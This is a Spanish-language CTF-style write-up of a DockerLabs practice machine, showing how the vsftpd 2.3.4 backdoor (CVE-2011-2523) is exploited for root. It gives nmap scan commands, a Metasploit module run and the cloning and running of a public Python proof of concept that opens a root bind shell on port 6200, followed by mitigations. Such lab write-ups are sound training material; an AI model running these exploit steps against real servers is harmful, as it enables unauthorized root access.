# FirstHacking
Laboratorio para practicar la explotación del backdoor de vsftpd 2.3.4 para obtener acceso como root.
# Writeup — Máquina Vulnerable (DockerLabs)

> CVE-2011-2523 · Backdoor vsFTPd 2.3.4 · Dificultad: Fácil · Plataforma: [DockerLabs](https://dockerlabs.es)
> Autor del writeup: David Rodríguez Somolinos

Resolución de una máquina Docker vulnerable mediante la explotación de la **backdoor de vsFTPd 2.3.4**, que concede una shell como `root` de forma directa.

---

## 📋 Información de la máquina

| | |
|---|---|
| **IP** | `172.17.0.2` |
| **SO** | Unix/Linux |
| **Puertos abiertos** | 21 (FTP) |
| **Servicio vulnerable** | vsFTPd 2.3.4 |
| **CVE** | CVE-2011-2523 (BID: 48539) |

---

## 🔍 1. Reconocimiento

Escaneo completo de puertos:

```bash
sudo nmap -p- -sS -sC -sV -vvv -T5 -Pn -n 172.17.0.2
```

```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.3.4
```

Un único puerto abierto: FTP con **vsFTPd 2.3.4**, una versión con backdoor conocida.

### Confirmación de la vulnerabilidad

```bash
sudo nmap -p21 --script=vuln 172.17.0.2
```

```
| ftp-vsftpd-backdoor:
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  BID:48539  CVE:CVE-2011-2523
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root) groups=0(root)
```

Nmap confirma que es explotable y que la ejecución se produce como `root`.

---

## 💣 2. La vulnerabilidad — CVE-2011-2523

En 2011, el código fuente de vsFTPd 2.3.4 fue comprometido y distribuido con una **puerta trasera**. Cuando un cliente se autentica con un usuario cuyo nombre termina en la carita `:)`, el servicio abre un **bind shell como root en el puerto 6200**. No requiere contraseña válida: basta con disparar el trigger.

---

## 🧪 3. Explotación

### Intento con Metasploit

```
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(...) > set RHOSTS 172.17.0.2
msf exploit(...) > set LHOST 10.0.2.15
msf exploit(...) > run

[+] 172.17.0.2:21 - The target appears to be vulnerable...
[+] 172.17.0.2:21 - Backdoor has been spawned!
[*] Exploit completed, but no session was created.
```

El módulo **dispara la backdoor correctamente** (`Backdoor has been spawned!`), pero **no llega a crear sesión**. Esto es habitual con este módulo: conecta al puerto 6200, pero la gestión de la sesión puede fallar según el payload/entorno de red. En lugar de pelearse con la configuración, se recurre a un PoC manual.

### Explotación con PoC manual (Python)

```bash
git clone https://github.com/padsalatushal/CVE-2011-2523.git
cd ./CVE-2011-2523
chmod +x exploit.py
python3 exploit.py -host 172.17.0.2
```

```
[+]Opening Connection to 172.17.0.2 on port 21: Done
[+]Opening Connection to 172.17.0.2 on port 6200: Done
[+]Success, shell opened
[*]Send `exit` to quit shell
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```

El exploit se autentica en el puerto 21 con el trigger `:)`, se conecta al bind shell del puerto 6200 y obtiene una **shell como `root` directa**. 🎉

> **Nota de método:** cuando un módulo de Metasploit confirma la explotación pero no devuelve sesión, un PoC independiente que replica el mismo mecanismo (aquí: conexión manual al puerto 6200) suele ser la vía más rápida.

---

## 🗺️ Resumen de la cadena de explotación

```
nmap -p-               → puerto 21 abierto (vsftpd 2.3.4)
nmap --script=vuln     → CVE-2011-2523 VULNERABLE
Trigger backdoor (:))  → bind shell en puerto 6200
python3 exploit.py     → shell root directa
```

Sin movimiento lateral ni escalada: la propia vulnerabilidad del servicio otorga `root`.

---

## 🛡️ Lecciones / mitigaciones

- **Actualizar vsFTPd** a una versión no comprometida (el backdoor afecta solo al binario troyanizado de la 2.3.4; cualquier versión mantenida posterior lo resuelve).
- **Verificar la integridad de los binarios** mediante firmas/hashes del proveedor oficial antes de desplegar.
- **Segmentar y filtrar** puertos no estándar como el 6200 con el firewall.
- **Monitorizar conexiones FTP anómalas** (autenticaciones con nombres de usuario sospechosos).

---

## 📚 Referencias

- [CVE-2011-2523 (MITRE)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523)
- [Análisis original del backdoor — Scary Beast Security](http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html)
- [PoC — padsalatushal/CVE-2011-2523](https://github.com/padsalatushal/CVE-2011-2523)

---
